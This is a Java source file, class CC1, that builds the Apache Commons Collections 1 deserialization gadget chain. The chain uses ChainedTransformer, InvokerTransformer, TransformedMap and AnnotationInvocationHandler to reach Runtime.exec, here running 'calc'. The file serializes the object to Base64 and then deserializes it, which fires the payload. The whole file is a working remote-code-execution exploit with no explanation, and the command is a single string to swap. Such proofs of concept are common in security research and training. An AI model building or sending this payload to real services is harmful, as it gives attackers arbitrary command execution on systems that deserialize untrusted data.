package com.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;


import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class CC1 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object,Object> map=new HashMap<> ();
        map.put("value", "fru1ts");
        Map<Object,Object> transformedMap= TransformedMap.decorate(map, null, chainedTransformer);

        Class c= Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor= c.getDeclaredConstructor(Class.class,Map.class);
        constructor.setAccessible(true);
        Object object= constructor.newInstance(Retention.class,transformedMap);
        serializeBase(object);
        deserialize(serializeBase(object));

    }
    public static String serializeBase(Object obj) throws Exception{
        ByteArrayOutputStream baos=new ByteArrayOutputStream();
        ObjectOutputStream oos=new ObjectOutputStream(baos);
        oos.writeObject(obj);
        return Base64.getEncoder().encodeToString(baos.toByteArray());
    }
    public static Object deserialize(String ser) throws Exception {
        byte[] base64decodeBytes= Base64.getDecoder().decode(ser);
        ByteArrayInputStream data=new ByteArrayInputStream(base64decodeBytes);
        ObjectInputStream ois=new ObjectInputStream(data);
        Object obj= ois.readObject();
        return obj;
    }
}

